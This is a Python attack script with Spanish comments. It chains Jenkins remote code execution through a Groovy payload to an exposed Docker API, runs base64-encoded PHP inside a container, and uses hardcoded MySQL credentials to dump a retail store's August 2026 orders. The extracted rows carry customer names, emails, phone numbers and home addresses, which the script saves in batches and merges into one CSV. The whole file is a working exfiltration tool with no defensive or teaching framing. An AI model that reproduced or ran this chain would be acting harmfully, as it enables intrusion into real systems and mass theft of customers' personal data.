# Exfil pedidos agosto 2026 (dev Sears) via Jenkins RCE -> Docker exec PHP -> MySQL
# Transporte: PHP y CSV viajan en base64 (inmune a escaping Groovy y encoding consola)
import base64, csv, io, os, re, subprocess, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
OUTDIR = os.path.join(HERE, "dev_sears_orders_2026_08")
CONSOLIDATED = os.path.join(HERE, "dev_sears_orders_august_2026.csv")
JENKINS_EXEC = os.path.join(HERE, "jenkins_exec.py")
BATCH = 1000

HEADER = ["id_pedido", "fecha", "id_forma_pago", "total", "estatus", "email",
          "nombre", "apellidos", "entregar_a", "telefono", "celular", "calle",
          "direccion", "colonia", "ciudad", "estado", "cp"]

GROOVY_TMPL = '''import groovy.json.JsonSlurper
import groovy.json.JsonOutput
def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"
def b64 = "__PHP_B64__"
def url = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def conn = url.openConnection()
conn.setRequestMethod("POST"); conn.setDoOutput(true)
conn.setRequestProperty("Content-Type", "application/json")
def body = JsonOutput.toJson([AttachStdout:true, AttachStderr:true, Cmd:["bash","-c","echo ${b64} | base64 -d > /tmp/q.php && php /tmp/q.php"]])
conn.outputStream.write(body.bytes); conn.outputStream.flush()
def r = new JsonSlurper().parseText(conn.inputStream.text)
def eid = r.Id
def su = new URL("http://${dHost}:${dPort}/exec/${eid}/start").openConnection()
su.setRequestMethod("POST"); su.setDoOutput(true)
su.setRequestProperty("Content-Type", "application/json")
su.outputStream.write('{"Detach":false,"Tty":true}'.bytes); su.outputStream.flush()
println su.inputStream.text
'''

PHP_QUERY = '''<?php
$c = new mysqli("172.27.141.6","apifincadodev","1q2w3e4r5t6y","tienda",3308);
if ($c->connect_error) { echo "DBERR: ".$c->connect_error."\\n"; exit(1); }
$c->set_charset("utf8mb4");
$sql = "SELECT p.Id, p.Fecha_Inicio, p.Forma_de_pago, p.total, p.Estatus, cl.Email, cl.Nombre, CONCAT_WS(' ', cl.Apellido_Paterno, cl.Apellido_Materno) AS apellidos, dp.Entregar, dp.Telefono, dp.celular, dp.calle, dp.Direccion, dp.Colonia, dp.Ciudad, dp.Estado, dp.CP FROM tienda.pedidos p INNER JOIN tienda.datos_pedido dp ON p.Num_pedido = dp.Pedido LEFT JOIN tienda.clientes cl ON p.Cliente = cl.Id WHERE p.Fecha_Inicio >= '2026-08-01' AND p.Fecha_Inicio < '2026-09-01' ORDER BY p.Id DESC LIMIT %d OFFSET %d";
$r = $c->query($sql);
if (!$r) { echo "QERR: ".$c->error."\\n"; exit(1); }
$buf = fopen("php://temp","w");
while ($row = $r->fetch_assoc()) { fputcsv($buf, $row); }
$rows = $r->num_rows;
rewind($buf);
$csv = stream_get_contents($buf);
fclose($buf);
echo "__B64_BEGIN__\\n";
echo base64_encode($csv)."\\n";
echo "__B64_END__ rows=".$rows."\\n";
'''

PHP_COUNT = '''<?php
$c = new mysqli("172.27.141.6","apifincadodev","1q2w3e4r5t6y","tienda",3308);
if ($c->connect_error) { echo "DBERR: ".$c->connect_error."\\n"; exit(1); }
$r = $c->query("SELECT COUNT(*) c FROM tienda.pedidos p INNER JOIN tienda.datos_pedido dp ON p.Num_pedido = dp.Pedido WHERE p.Fecha_Inicio >= '2026-08-01' AND p.Fecha_Inicio < '2026-09-01'");
if (!$r) { echo "QERR: ".$c->error."\\n"; exit(1); }
$row = $r->fetch_assoc();
echo "COUNT=".$row["c"]."\\n";
'''


def run_php(php_code, tag):
    b64 = base64.b64encode(php_code.encode("utf-8")).decode()
    groovy = GROOVY_TMPL.replace("__PHP_B64__", b64)
    tmp = os.path.join(HERE, "_tmp_exfil_%s.groovy" % tag)
    with open(tmp, "w") as f:
        f.write(groovy)
    try:
        p = subprocess.run([sys.executable, JENKINS_EXEC, tmp],
                           capture_output=True, timeout=300)
        return p.stdout.decode("utf-8", errors="replace")
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass


def parse_batch(out):
    m = re.search(r"__B64_BEGIN__\s*\r?\n([A-Za-z0-9+/=\r\n]+?)\s*\r?\n__B64_END__ rows=(\d+)", out)
    if not m:
        return None
    csv_text = base64.b64decode(re.sub(r"\s", "", m.group(1))).decode("utf-8", errors="replace")
    rows = [r for r in csv.reader(io.StringIO(csv_text)) if r]
    return rows, int(m.group(2))


def main():
    os.makedirs(OUTDIR, exist_ok=True)

    print("[*] Fase 1: COUNT de pedidos agosto 2026...")
    out = run_php(PHP_COUNT, "count")
    m = re.search(r"COUNT=(\d+)", out)
    if not m:
        print("[!] COUNT fallo. Output crudo:")
        print(out[:3000])
        sys.exit(1)
    total_expected = int(m.group(1))
    print("[+] Pedidos agosto 2026 (JOIN con PII): %d" % total_expected)
    if total_expected == 0:
        print("[!] Nada que exfiltrar.")
        sys.exit(0)

    print("[*] Fase 2: extraccion en batches de %d..." % BATCH)
    total_rows = 0
    offset = 0
    while offset < total_expected:
        idx = offset // BATCH
        bpath = os.path.join(OUTDIR, "batch_%04d.csv" % idx)
        if os.path.exists(bpath):
            with open(bpath, newline="", encoding="utf-8") as f:
                existing = sum(1 for _ in f) - 1
            if existing > 0:
                print("[=] batch_%04d ya existe (%d filas) — skip" % (idx, existing))
                total_rows += existing
                offset += BATCH
                continue
        out = run_php(PHP_QUERY % (BATCH, offset), "b%04d" % idx)
        parsed = parse_batch(out)
        if not parsed:
            print("[!] Batch %d (offset %d) fallo. Output crudo:" % (idx, offset))
            print(out[:3000])
            sys.exit(1)
        rows, reported = parsed
        if len(rows) != reported:
            print("[!] WARN batch_%04d: parseadas %d vs reportadas %d" % (idx, len(rows), reported))
        with open(bpath, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(HEADER)
            w.writerows(rows)
        total_rows += len(rows)
        print("[+] batch_%04d.csv -> %d filas (acumulado %d/%d)" % (idx, len(rows), total_rows, total_expected))
        if reported < BATCH:
            break
        offset += BATCH
        time.sleep(0.3)

    print("[*] Fase 3: consolidando...")
    n = 0
    with open(CONSOLIDATED, "w", newline="", encoding="utf-8") as fo:
        w = csv.writer(fo)
        w.writerow(HEADER)
        for i in range((total_expected // BATCH) + 2):
            bpath = os.path.join(OUTDIR, "batch_%04d.csv" % i)
            if not os.path.exists(bpath):
                continue
            with open(bpath, newline="", encoding="utf-8") as fi:
                rd = csv.reader(fi)
                next(rd, None)
                for row in rd:
                    if row:
                        w.writerow(row)
                        n += 1
    print("[+] Consolidado: %s (%d filas)" % (CONSOLIDATED, n))

    print("[*] Sample de 20 registros:")
    with open(CONSOLIDATED, newline="", encoding="utf-8") as f:
        rd = csv.reader(f)
        hdr = next(rd)
        print(" | ".join(hdr))
        for i, row in enumerate(rd):
            if i >= 20:
                break
            print(" | ".join(row))


if __name__ == "__main__":
    main()
